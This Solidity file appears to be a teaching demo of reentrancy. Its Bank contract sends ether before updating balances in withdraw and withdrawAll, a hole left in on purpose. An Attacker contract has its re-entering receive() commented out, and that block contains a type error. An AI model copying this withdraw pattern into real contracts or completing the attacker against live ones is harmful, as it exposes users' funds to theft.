// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Bank {

    mapping(address => uint) public balances;
    
    event Banker(address sender);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint amount) external {
       require(balances[msg.sender] >= amount, "not enough money"); 
       (bool result,) = msg.sender.call{value:amount}("");
       require(result, "fail to send");
       balances[msg.sender] -= amount;
    }

    function withdrawAll() external {
       (bool result,) = msg.sender.call{value:balances[msg.sender]}("");

       require(result, "fail to send");

       balances[msg.sender] = 0;
    }


    function getBankBalance() public view returns(uint) {
        return address(this).balance;
    }

    function getBalanceOf(address who) public view returns(uint) {
        return balances[who];
    }
}

contract Attacker {

    Bank public bank;

    event Info(address sender);

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function sendEther() external payable {
        bank.deposit{value:msg.value}();
        emit Info(msg.sender);
    }

    function receiveEther(uint amount) external {
        bank.withdraw(amount);
        emit Info(msg.sender);
    }

    function receiveEtherAll() external {
        bank.withdrawAll();
        emit Info(msg.sender);
    }

    // receive() external payable {
    //     if(address(msg.sender).balance > 0) {
    //         bank.withdraw(1000000000000000000);
    //     } else {
    //         emit Info("It was good time :)");
    //     }
    // }
}